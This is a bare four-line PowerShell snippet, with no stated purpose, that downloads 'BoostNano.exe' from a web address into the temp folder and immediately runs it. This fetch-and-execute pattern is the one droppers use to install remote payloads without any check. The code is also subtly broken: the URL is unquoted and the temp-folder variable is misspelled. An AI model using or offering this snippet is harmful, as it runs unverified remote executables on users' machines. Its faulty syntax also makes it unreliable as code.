$url = https://Dev.com/BoostNano.exe
$temp = "$envTEMP\BoostNano.exe"

Invoke-WebRequest $url -OutFile $temp
Start-Process $temp